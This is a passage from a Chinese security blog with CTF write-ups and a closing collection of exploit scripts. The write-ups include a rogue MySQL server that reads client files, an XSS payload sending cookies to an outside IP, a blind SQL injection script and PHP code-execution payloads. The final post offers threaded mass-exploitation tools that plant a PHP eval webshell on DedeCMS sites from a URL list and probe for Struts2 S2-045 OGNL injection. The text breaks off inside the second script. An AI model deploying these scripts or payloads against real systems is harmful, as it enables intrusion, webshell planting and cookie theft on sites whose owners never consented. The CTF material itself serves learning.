参考：https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/ MySQL协议中比较特别的一点就是客户端并不会去记录已请求的命令，而是根据服务器的响应来执行查询。 这意味着恶意MySQL服务器可以模拟初始握手过程，等待SQL语句数据包，忽略这个数据包然后响应一个LOCAL DATA INFILE请求。 也就是在我们在服务端运行py文件模拟mysql服务器，客户端连接的时候构造恶意数据包读取客户端的文件。 题目提供的 agent.py 其实是为了检测客户端本地是否开启了 mysql 服务，只需要往回发送字符串 mysqld 就能绕过检测。 首先运行agent.py 只是为了检测是否开启了mysql， #!/usr/bin/env python # -*- coding: utf-8 -*- # @Time : 12/1/2019 2:58 PM # @Author : fz # @Site : # @File : agent.py # @Software: PyCharm import json from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler from optparse import OptionParser from subprocess import Popen, PIPE class RequestHandler(BaseHTTPRequestHandler): def do_GET(self): request_path = self.path print(&quot;\n----- Request Start -----&gt;\n&quot;) print(&quot;request_path :&quot;, request_path) print(&quot;self.headers :&quot;, self.headers) print(&quot;&lt;----- Request End -----\n&quot;) self.send_response(200) self.send_header(&quot;Set-Cookie&quot;, &quot;foo=bar&quot;) self.end_headers() result = self._func() self.wfile.write(json.dumps(result)) def do_POST(self): request_path = self.path # print(&quot;\n----- Request Start -----&gt;\n&quot;) print(&quot;request_path : %s&quot;, request_path) request_headers = self.headers content_length = request_headers.getheaders(&apos;content-length&apos;) length = int(content_length[0]) if content_length else 0 # print(&quot;length :&quot;, length) print(&quot;request_headers : %s&quot; % request_headers) print(&quot;content : %s&quot; % self.rfile.read(length)) # print(&quot;&lt;----- Request End -----\n&quot;) self.send_response(200) self.send_header(&quot;Set-Cookie&quot;, &quot;foo=bar&quot;) self.end_headers() result = self._func() self.wfile.write(json.dumps(result)) def _func(self): netstat = Popen([&apos;netstat&apos;, &apos;-tlnp&apos;], stdout=PIPE) netstat.wait() ps_list = netstat.stdout.readlines() result = [{&apos;local_address&apos;:&quot;0.0.0.0:3306&quot;,&quot;Process_name&quot;:&quot;1234/mysqld&quot;}] for item in ps_list[2:]: tmp = item.split() Local_Address = tmp[3] Process_name = tmp[6] tmp_dic = {&apos;local_address&apos;: Local_Address, &apos;Process_name&apos;: &apos;mysqld&apos;} result.append(tmp_dic) return result do_PUT = do_POST do_DELETE = do_GET def main(): port = 8123 print(&apos;Listening on localhost:%s&apos; % port) server = HTTPServer((&apos;0.0.0.0&apos;, port), RequestHandler) server.serve_forever() if __name__ == &quot;__main__&quot;: parser = OptionParser() parser.usage = ( &quot;Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data\n&quot; &quot;Run:\n\n&quot;) (options, args) = parser.parse_args() main() 然后运行以下脚本读取flag。 import socket from time import sleep filename=&apos;~/.mysql_history&apos; a=&apos;4a0000000a352e352e353300050000007b212f663926524900fff72102000f8015000000000000000000005963644f3d2336265b796f41006d7973716c5f6e61746976655f70617373776f726400&apos;.decode(&apos;hex&apos;) b=&apos;0100000200&apos;.decode(&apos;hex&apos;) c=chr(len(filename)+1)+&quot;\x00\x00\x01\xFB&quot;+filename HOST = &apos;0.0.0.0&apos; PORT = 3306 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((HOST, PORT)) s.listen(5) print &apos;Server start at: %s:%s&apos; %(HOST, PORT) print &apos;wait for connection...&apos; while True: conn, addr = s.accept() print &apos;Connected by &apos;, addr conn.send(a) print conn.recv(1024).encode(&apos;hex&apos;) conn.send(b) print conn.recv(1024).encode(&apos;hex&apos;) conn.send(c) print conn.recv(1024)[4:]]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[西湖挑战赛web]]></title>
    <url>%2F2019%2F04%2F13%2F%E8%A5%BF%E6%B9%96%E6%8C%91%E6%88%98%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[前言这次西湖CTF感觉难度适中，学到了不少东西。记下来做个笔记。 web1url:61.164.47.198:10000 第一道比较简单， 很明显是文件包含，包含/etc/passwd 验证一下。 可以看到没任何过滤，接着找flag文件肯定不会是很简单直接包含得到，flag文件名也不清楚。接着发包看源码找到提示。 ZGlyLnBocA== base64解码 dir.php 常规直接读取源码，利用file协议base64读取php源码。。 http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=index.php index.php文件 &lt;?php $a = @$_GET[&apos;file&apos;]; if (!$a) { $a = &apos;./templates/index.html&apos;; } echo &apos;include $_GET[\&apos;file\&apos;]&apos;; if (strpos(&apos;flag&apos;,$a)!==false) { die(&apos;nonono&apos;); } include $a; ?&gt; &lt;!--hint: ZGlyLnBocA== --&gt; 同理读取dir.php &lt;?php $a = @$_GET[&apos;dir&apos;]; if(!$a){ $a = &apos;/tmp&apos;; } var_dump(scandir($a)); var_dump可以直接读取目录， 在根目录下读取到flag文件，直接包含读取。 web2url:61.164.47.198:10001 开局两个框，登陆全靠admin，事实证明，点击登陆什么也不输入也能进后台。 后台分三个部分 首先是留言，然后report报告问题。 写个脚本跑出md5并不困难，猜测是构造xss页面获取cookie，然后提交到管理员，获得cookie，然后执行命令。 接下来就是构造xss， script被过滤了，尝试各种标签，发现标签没有过滤，但是触发事件过滤了，如onload=,onerror=，很快可以发现，iframe的data协议没有被过滤， &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; 然后构造获取cookie的xss。 经过测试， &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb24uaHJlZj0naHR0cDovL3VybDo4ODg4Lz9hPScrZG9jdW1lbnQuY29va2llPC9zY3JpcHQ+&quot;&gt; 不太清楚这条为什么运行不了，接着使用伪协议，实体化绕过。 &lt;iframe src=&quot;javasc&amp;#114;ipt:window.location.href=&apos;http://47.106.185.69:8888/?a=&apos;+document.cookie&quot;&gt; 接着就是爆破md5截断脚本。 # -*- coding: utf-8 -*- import hashlib from multiprocessing.dummy import Pool as ThreadPool # MD5截断数值已知 求原始数据 # 例子 substr(md5(captcha), 0, 6)=60b7ef def md5(s): # 计算MD5字符串 return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest() keymd5 = &apos;5416ad&apos; #已知的md5截断值 md5start = 0 # 设置题目已知的截断位置 md5length = 6 def findmd5(sss): # 输入范围 里面会进行md5测试 key = sss.split(&apos;:&apos;) start = int(key[0]) # 开始位置 end = int(key[1]) # 结束位置 result = 0 for i in range(start, end): # print(md5(i)[md5start:md5length]) if md5(i)[0:6] == keymd5: # 拿到加密字符串 result = i print(result) # 打印 break list=[] # 参数列表 for i in range(10): # 多线程的数字列表 开始与结尾 list.append(str(10000000*i) + &apos;:&apos; + str(10000000*(i+1))) pool = ThreadPool() # 多线程任务 pool.map(findmd5, list) # 函数 与参数列表 pool.close() pool.join() 此题烂尾，题目无辜暴毙！ misc-TTL还有一道有意思的misc记录一下。 题目描述： 我们截获了一些IP数据报，发现报文头中的TTL值特别可疑，怀疑是通信方嵌入了数据到TTL，我们将这些TTL值提取了出来，你能看出什么端倪吗？ 然后是一段奇怪的TTL字段，二十几万条这里就不写出来了。 然后百度搜索TTL 隐藏信息。 这么一说确实应该是这种隐藏，因为给的数字127 191 63 后六位都是111111 127 ==&gt;&gt; 0111111163 ==&gt;&gt; 00111111191 ==&gt;&gt; 10111111255 ==&gt;&gt; 11111111 按道理说只有这四个数字，因为后六个数字是固定的，前两个数字 只有两种选择，2X2=4。 接下来写脚本提取出来每个二进制的前两位。 import binascii key=open(&apos;./ttl.txt&apos;,&apos;r&apos;) f1 = open(&quot;./1.txt&quot;,&quot;a+&quot;) f2 = open(&quot;./2.txt&quot;,&quot;a+&quot;) a=0 for ttl in key.readlines(): if(ttl[4:7]==&quot;127&quot;): f1.write(&quot;01&quot;) a=a+1 if a%4==0: f1.write(&quot;\n&quot;) elif(ttl[4:6]==&quot;63&quot;): f1.write(&quot;00&quot;) a=a+1 if a%4==0: f1.write(&quot;\n&quot;) elif(ttl[4:7]==&quot;191&quot;): f1.write(&quot;10&quot;) a=a+1 if a%4==0: f1.write(&quot;\n&quot;) elif(ttl[4:7]==&quot;255&quot;): f1.write(&quot;11&quot;) a=a+1 if a%4==0: f1.write(&quot;\n&quot;) f3 = open(&quot;./1.txt&quot;,&quot;r&quot;) for ttls in f3.readlines(): f2.write(chr(int(ttls,2))) with open(&apos;./2.txt&apos;, &apos;rt&apos;) as f: data = f.read() flag = binascii.unhexlify(data)#转化为16进制的图片 f4 = open(&quot;1.jpg&quot;,&apos;wb&apos;) f4.write(flag) 得到结果。 内容太多实在不像flag，但是细心点观察可以看到前四位是ffd8 jpg图片的格式。 得到最终图片，貌似是个二维码。 但是不全，应该是需要分离。foremost分离。 提取五张二维码图片，拼接成一张完整的二维码图片。 加上原来的一共六张图片拼成二维码，得到flag。]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[掘安杯网络安全技能挑战赛]]></title>
    <url>%2F2019%2F04%2F08%2F%E6%8E%98%E5%AE%89%E6%9D%AF%2F</url>
    <content type="text"><![CDATA[转：https://xz.aliyun.com/t/4741 前言掘安杯网络安全技能挑战赛。题目相对简单适合新手入门，偏向php代码基础漏洞的学习。 web1题目url:http://120.79.1.69:10001/ 相当于签到题目，没什么难度， 进行抓包base64解码即可得到第一道题的flag。 amFjdGZ7OWMxZTNkMThjNDMzZDkzZDk2YTk2NGMwMGFkMzBiOGZ9 jactf{9c1e3d18c433d93d96a964c00ad30b8f} web2题目url:http://120.79.1.69:10002可以下载文件源码。但是flag.txt下载不了，查看源码提示。 下载file=flag.php下载源码。 &lt;?php header(&apos;Content-Type: text/html; charset=utf-8&apos;); //网页编码 function encrypt($data, $key) { $key = md5 ( $key ); $x = 0; $len = strlen ( $data );#32 $l = strlen ( $key ); #5 for($i = 0; $i&lt;$len; $i ++) { if ($x == $l) { $x = 0; } $char .= $key {$x}; $x ++; } for($i = 0; $i &lt; $len; $i ++) { $str .= chr ( ord ( $data {$i} ) + (ord ( $char {$i} ))%256 ); } echo base64_encode ( $str ); } function decrypt($data, $key) { $key = md5 ( $key ); $x = 0; $data = base64_decode ( $data ); $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &lt; $len; $i ++) { if ($x == $l) { $x = 0; } $char .= substr ( $key, $x, 1 ); $x ++; } for($i = 0; $i &lt; $len; $i ++) { if (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) { $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) ); } else { $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) ); } } echo $str; } $key=&quot;MyCTF&quot;; $flag=&quot;o6lziae0xtaqoqCtmWqcaZuZfrd5pbI=&quot;; ?&gt; 解读：这很明显是个加密解密，其中给了加密后的flag，利用第一个函数加密，钥匙也给了MyCTF。但是不清楚为啥给了解密算法，不给也很容易逆推就可以解出来。 所以最终就是直接decrypt($flag,$key),就会打印出来flag， 也可以验证一下。 web3url地址：http://120.79.1.69:10003 标题很简单的猜密码， 先看看源码，有PHP源码 session_start(); $_SESSION[&apos;pwd&apos;]=time(); if (isset ($_POST[&apos;password&apos;])) { if ($_POST[&apos;pwd&apos;] == $_SESSION[&apos;pwd&apos;]) die(&apos;Flag:&apos;.$flag); else{ print &apos;&lt;p&gt;猜测错误.&lt;/p&gt;&apos;; $_SESSION[&apos;pwd&apos;]=time().time(); } } 代码相当精简，如果post的pwd等于当前的时间，就返回flag,尝试过提前预判时间，发现不可以，就只能直接入手题目了，这里用到了一个弱比较，来进行一个空比较，session ID是我们可控的，pwd也是我们可控的，唯一就是session我们无法控制是多少，但是可以置为空， 删除PHPSESSID，然后使得pwd= 空，判断就变成了空等于空，可以得到flag。 web4url地址：http://120.79.1.69:10004 这个题一开始工具出问题扫半天没扫到，但是完全没有入手点，后来发现是工具字典问题，建议CTF找不到入手点就多扫扫，可能有遗漏，这个题目就是扫目录，有个后门文件，shell.php 一般来说后门文件就是爆破密码，本题也不例外，在burp intruder模块里进行爆破。 web5 url地址:http://120.79.1.69:10005 这道题目综合了三个知识点，python session快速计算提交，注入绕过，代码审计。综合起来还是搞了半天。 1.有个登陆框， 有返回报错信息，不难想到，肯定和注入挂钩，fuzz发现，or被过滤为空，但是很容易绕过，常规双写绕过，select也被过滤了，也可以使用双写绕过，selselectect，后台验证如果是select就替换为空，selselectect 就等于 select，空格被过滤，这里用/**/替换， 最终poc &apos;oorr/**/ascii(substr((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1),%s,1))&gt;1/**/--/**/+&apos; 如果正确的话回显用户名正确，错误的话回显用户名错误，基于布尔的盲注。脚本。 #!/usr/bin/python # -*- coding: UTF-8 -*- import sys import requests url=&quot;http://120.79.1.69:10005/index.php?check&quot; password=&quot;&quot; for i in range(1,30): payload=&quot;&apos;oorr/**/ascii(substr((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1),%s,1))&gt;%s/**/--/**/+&apos;&quot; min=10 max=150 while abs(max-min)&gt;1: mid=int((max+min)/2) p = payload % (str(i),str(mid)) data={&quot;username&quot;:p} res=requests.post(url=url,data=data) if res.content.find(&quot;goodboy&quot;)!=-1: min=mid else: max=mid password=password+chr(max) print password 得到密码。 最终poc 账号：&apos;&apos;&apos;=&apos; 密码：ajahas&amp;&amp;*44askldajaj 接下来快速计算验证码，py脚本， # -*- encoding:utf8 -*- import sys import requests import re url=&quot;http://120.79.1.69:10005/index.php&quot; s=requests.Session() r=s.get(url=url) matchp=re.search(r&apos;(.{1}\d+[+\-*]\d+[+\-*]\d+.{1}.{1}){4}.{1}\d+[+\-*]\d+[+\-*]\d+.{1}&apos;,r.text).group()#.{1}匹配前面任意一个字符，因为给的括号是中文括&gt;号后面同理。 matchp=matchp.replace(u&apos;（&apos;,&apos;(&apos;) matchp=matchp.replace(u&apos;）&apos;,&apos;)&apos;) matchp=matchp.replace(&apos;X&apos;,&apos;*&apos;) num=round(eval(matchp)) urls=&quot;http://120.79.1.69:10005/index.php?check&quot; data={&quot;username&quot;:&quot;&apos;&apos;&apos;=&apos;&quot;,&quot;code&quot;:num,&quot;password&quot;:&quot;ajahas&amp;&amp;*44askldajaj&quot;} res=s.post(url=urls,data=data) print (res.text) 得到回显。 又进入另一个坑，下载zip包，zip包被加密了， 网页回显源码中给出了form的密码，打开form是道代码审计同样很简短。 Private Function getPassword(ByVal str As String) As String Dim reString As String Dim i As Integer i = 1 While (i &lt;= Len(str)) reString = reString &amp; Mid(str, i, 1) i = i + (i Mod 5) Wend getPassword = reString End Function Private Sub Command1_Click() Dim Dictionary As String Dictionary = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot; Dim password As String password = getPassword(Dictionary) Dim psw As String psw = Text1.Text If (psw = password) Then MsgBox &quot;The password is correct!&quot;, vbOKOnly, &quot;密码正确&quot; Text1.Text = &quot;Password for next pass : &quot; &amp; getPassword(password) Else MsgBox &quot;PasswordFail!&quot;, vbOKOnly, &quot;密码错误&quot; End If End Sub 写个python脚本解出flag.jpg的压缩密码。 # -*- encoding:utf8 -*- def getPassword(str): restr=&apos;&apos; i=1 while i &lt;=(len(str)): restr= restr+(str[i-1:i]) i=i+(i%5) return restr dict=&quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot; password=getPassword(dict) password=getPassword(password) print (password) 得到密码 VmH0wW3DZalBnmmSalV1SYSGRr1r3jVYcFrHWkUUlhljkFzCbXaEKyaVJymT1FlVTVskVWhGtonaGU2WWGhVXYol1WVI1F2odFuk 将flag.jpg以txt方式打开得到flag。 web6url地址：http://120.79.1.69:10006 一道代码审计题目，依然很精简。 &lt;?php error_reporting(0); if(isset($_GET[&apos;action&apos;])) { $action = $_GET[&apos;action&apos;]; } if(isset($_GET[&apos;action&apos;])){ $arg = $_GET[&apos;arg&apos;]; } if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)){ show_source(__FILE__); } else { $action($arg,&apos;&apos;); } 正则匹配 i 不区分大小写 /s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[fnrtv] /D如果使用$限制结尾字符,则不允许结尾有换行; 精简的源码，考的代码执行，可以参考一下P牛 的create_function()代码注入，不过本题稍微有点点变化，本题其实只有一个点， 传入action参数，我们可控函数，寻找一个能够执行命令的函数就可以，但是需要这个函数有两个参数，eval就不可以，assert可以传入两个参数，可以直接getshell， 正则匹配绕过匹配开头，使用\绕过。 完整poc http://120.79.1.69:8886/web6?action=\assert&amp;arg=system(&#39;dir&#39;) 由于题目关闭了，本地复现， 通过命令查找，即可获得flag。 参考文章：https://mochazz.github.io/2019/01/12/create_function%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0RCE/ 后来题目环境变了， assert不能使用了，之前assert可以说是个bug，还是要来一遍正规做法。 题目url:http://120.79.1.69:10006 首先要绕过正则，数字字母下划线被过滤，但是需要调用函数，使用create_function创建函数，\create_function就是调用全局的create_function函数，正好绕过了正则，接下来就是拼接字符串。poc http://120.79.1.69:10006?action=\create_function&amp;arg=){}system(&apos;ls&apos;);// 拼入字符串后的结果。 \create_function(){}system(&apos;ls&apos;);//,&apos;&apos;); 得到flag。 web7这道题目依然是代码审计，主要是考弱比较以及MD5等方面的绕过。 题目url:http://120.79.1.69:8887/web7 打开即可获得源码，这里我贴出源码。 &lt;?php highlight_file(__FILE__); include(&apos;flag.php&apos;); $str1 = @$_GET[&apos;str1&apos;]; $str2 = @$_GET[&apos;str2&apos;]; $str3 = @$_GET[&apos;str3&apos;]; $str4 = @$_GET[&apos;str4&apos;]; $str5 = (string)@$_POST[&apos;str5&apos;]; $str6 = (string)@$_POST[&apos;str6&apos;]; $str7 = (string)@$_POST[&apos;str7&apos;]; if( $str1 == $str2 ){ die(&apos;str1 OR Sstr2 no no no&apos;); } if( md5($str1) != md5($str2) ){ die(&apos;step 1 fail&apos;); } if( $str3 == $str4 ){ die(&apos;str3 OR str4 no no no&apos;); } if ( md5($str3) !== md5($str4)){ die(&apos;step 2 fail&apos;); } if( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 ){ die(&apos;str5 OR str6 OR str7 no no no&apos;); } if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7)){ die(&apos;step 3 fail&apos;); } if(!($_POST[&apos;a&apos;]) and !($_POST[&apos;b&apos;])) { echo &quot;come on!&quot;; die(); } $a = $_POST[&apos;a&apos;]; $b = $_POST[&apos;b&apos;]; $m = $_GET[&apos;m&apos;]; $n = $_GET[&apos;n&apos;]; if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; 6)) { echo &quot;a OR b fail!&quot;; die(); } if ((strlen($m) &gt; 4) || (strlen($n) &gt; 4)) { echo &quot;m OR n fail&quot;; die(); } $str8 = hash(&apos;md5&apos;, $a, false); $str9 = strtr(hash(&apos;md5&apos;, $b, false), $m, $n); echo &quot;&lt;p&gt;str8 : $str8&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;str9 : $str9&lt;/p&gt;&quot;; if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6)) { echo &quot;You&apos;re great,give you flag:&quot;; echo $flag; } 还算比较常规比较简单的源码，主要是考几个php知识点。 1.首先需要传参数str1不能等于str2，但是需要md5一样，不清楚的百度php md5弱比较。也就是字符串QNKCDZO 和字符串s878926199a，这两个加密出来的md5是 MD5(&quot;QNKCDZO&quot;)=0e830400451993494058024219903391 MD5(&quot;s878926199a&quot;)=0e545993274517709034328855841020 在php中如果是0e开头的字符串进行==比较，会认为是科学记数法0e，0的几次方，所以结果自然是0，这样就达到了字符串比较不相等，但是MD5值相等的绕过方法，前提是0e后面跟的是数字，如果是0e1a223…，0e后面有个a字母则无法转化成0。 2.str3和str4和str1 str2差不多，唯一变化是这次用到了!==需要绕过，但是在这种严密的!==，0e这种不可以绕过了，他会一个一个字符的对比，而不是解析为0，这个时候需要用到数组类型不同来绕过，也就是str3[]=1,str4=0，因为这两种根本不是同一种类型的，所以自然无法比较返回false，进而绕过。 3.str5 str6 str7，首先第一个肯定不能三个相等，但是下面又用严格的判断必须md5相等，在php中===和!==这种几乎是没办法绕过的，所以只能让他们的md5真正相等，如果一开始就去绕可能就陷进去了，这个判断的难点在于找到三个真正相等的MD5值的原型。这里参考一篇文章。 https://xz.aliyun.com/t/3161#toc-5 基于全等的MD5碰撞绕过这一目录下的讲解，很详细，需要下载他所说的两个工具，然后按照他的命令 D:\fastcoll&gt;fastcoll_v1.0.0.5.exe -o jlzj0 jlzj1 #-o参数代表随机生成两个相同MD5的文件 D:\fastcoll&gt;fastcoll_v1.0.0.5.exe -p jlzj1 -o jlzj00 jlzj01 #-p参数代表根据jlzj1文件随机生成两个相同MD5的文件，注意：生成的MD5与jlzj1不同 D:\fastcoll&gt;tail.exe -c 128 jlzj00 &gt; a #-c 128代表将jlzj00的最后128位写入文件a，这128位正是jlzj1与jlzj00的MD5不同的原因 D:\fastcoll&gt;tail.exe -c 128 jlzj01 &gt; b #同理 D:\fastcoll&gt;type jlzj0 a &gt; jlzj10 #这里表示将jlzj0和a文件的内容合并写入jlzj10 D:\fastcoll&gt;type jlzj0 b &gt; jlzj11 #同理写入jlzj11 生成文件即可，生成的文件内容进行MD5加密就是相同的，但是需要url编码提交到burp里面发包,如果在浏览器里会自动解码，出现大大小小的各种问题。 编码参考：https://xz.aliyun.com/t/2232 最终将生成的三个url编码之后的分别复制给str5 str6 str7。 4.第四个点，首先post a和b，然后进入第二个判断，a必须是大写字母，b必须是数字，(is_numeric函数也有一些漏洞)，b的长度不能大于6，这里我们把视角移到最后一个if判断 if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6)) 这里用===判断，b的长度必须为6，刚刚我们说了===很难绕过，所以b的长度就只能为6，其中a不能等于b，这个很容易做到，str8 == str9， $str8 = hash(&apos;md5&apos;, $a, false); $str9 = strtr(hash(&apos;md5&apos;, $b, false), $m, $n); 很显然又是需要0e来绕过使得md5后的a b相等，这里a的值很简单，利用网上现有的MD5之后的原型QNKCDZO，并且都是大写，但是b想要找到六位的并且0e开头能够利用的仿佛并找不到，这里想了很久，不过还好有一个字符替换， strtr(hash(&apos;md5&apos;, $b, false), $m, $n) 这里是将m替换为n，这样我们就可以利用替换，将一些可能构造的md5值构造成我们需要的，比如 0e123123aaa，我们可以让m=a，n=1，替换为0e123123111，这样就可以进行判断绕过了，这里还要提到上面提示了一个点用is_numeric函数的漏洞，他可以接受十六进制，0xFFFF他同样认为是数字，所以我们写个脚本找到0e开头的md5值，然后替换掉其中的字母，最终绕过。 for($i=1000;$i&lt;9999;$i++) { $b=&quot;0x&quot;.$i; #echo md5($b); $c=md5($b); if(preg_match(&apos;/^0e/&apos;,$c)) { echo $b.&quot;=====&gt;&gt;&quot;; echo $c; echo &quot;&lt;br/&gt;&quot;; } } 选择其中一个 0x6156=====&gt;&gt;0ec4899c94ada8d08a6ada8623c6ff01 刚好md5值有数字 cadf，四个字符刚好用长度最大为4的m n来替换，完整的poc，得到flag。]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[poc脚本整理]]></title>
    <url>%2F2019%2F03%2F23%2F%E4%B8%80%E4%BA%9B%E8%84%9A%E6%9C%ACpoc%2F</url>
    <content type="text"><![CDATA[织梦dede漏洞版本：Dedecms 5.5 织梦(Dedecms)select_soft_post.php页面变量未初始漏洞 # -*- coding:UTF-8 -*- import requests import threading import time import sys class check(threading.Thread): #判断是否存在这个漏洞的执行函数 def __init__(self, url, sem): super(check, self).__init__() #继承threading类的构造方法，python3的写法super().__init__() self.url = url self.sem = sem def run(self): requests.packages.urllib3.disable_warnings() payload = &quot;include/dialog/select_soft_post.php&quot; multipart_form_data = { &apos;activepath&apos;:(None,&apos;/data/cache&apos;), &apos;cfg_basedir&apos;:(None,&apos;../../&apos;), &apos;cfg_imgtype&apos;:(None,&apos;php&apos;), &apos;cfg_not_allowall&apos;:(None,&apos;txt&apos;), &apos;cfg_softtype&apos;:(None,&apos;php&apos;), &apos;cfg_mediatype&apos;:(None,&apos;php&apos;), &apos;f&apos;:(None,&apos;form1.enclosure&apos;), &apos;job&apos;:(None,&apos;upload&apos;), &apos;newname&apos;:(None,&apos;hag.php&apos;), &apos;uploadfile&apos;:(&apos;hag.php&apos;,&apos;&lt;?php eval($_POST[q]);?&gt;&apos;,&apos;application/octet-stream&apos;), } try: r = requests.post(self.url.strip()+payload,files=multipart_form_data,timeout=6,verify=False) except IOError: print &quot;time out 1&quot; newurl=self.url.strip()+&quot;data/cache/hag.php&quot; payloads={&apos;q&apos;:&apos;echo &quot;sectest&quot;;&apos;} try: rr=requests.post(newurl,allow_redirects=False,timeout=3,data=payloads)#测试是否文件创建成功 body=rr.text if body.find(&apos;sectest&apos;)!=-1: with open(&apos;./success.txt&apos;,&apos;a&apos;) as f1: f1.write(newurl+&quot;\n&quot;) print(&quot;web is success-----&gt;&gt;&gt;&gt;&gt;&gt;&quot;+self.url) else: print(&quot;web is fail--------&gt;&gt;&gt;&gt;&gt;&gt;&quot;+self.url) except IOError: print &quot;time out 2&quot; self.sem.release() if __name__ == &apos;__main__&apos;: f = open(&quot;./1.txt&quot;) sem = threading.Semaphore(10) #最大线程数为10个 for url in f.readlines(): sem.acquire() #遍历一个就获得一个线程，直到达到最大 host_thread = check(url,sem) host_thread.start()#执行check()的执行函数 使用方法：在当前页面下创建./1.txt（为需要检测的url），success.txt为含有漏洞的url。 s2-045java的漏洞，s2-045网上可找到详情。 # -*- coding:UTF-8 -*- import urllib2 import threading import requests requests.packages.urllib3.disable_warnings() header = { &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;, &apos;Accept-Encoding&apos;: &apos;gzip, deflate, compress&apos;, &apos;Cache-Control&apos;: &apos;max-age=0&apos;, &apos;Connection&apos;: &apos;close&apos;, &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&apos;, &apos;Content-Type&apos;:&quot;%{(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(88888888-23333+1222)).(#o.close())}&quot; } class check(threading.Thread): #判断是否存在这个漏洞的执行函数 def __init__(self, url, sem): super(check, self).__init__() #继承threading类的构造方法，python3的写法super().__init__() self.url = url self.sem = sem def run(self): try: response = requests.post(self.url,data=&apos;&apos;,headers=header,verify=False,allow_redirects = False,timeout=6) if response.content.find(&quot;88866777&quot;)!=-1: print &apos;success------&gt;&gt;&gt;&gt;&gt;&gt;&apos;+self.url with open(&apos;./success.txt&apos;,&apos;a&apos;) as f1: f1.write(newurl+&quot;\n&quot;) else: print &apos;fail---------&gt;&gt;&gt;&gt;&gt;&gt;&apos;+self.url except Exception as e: print 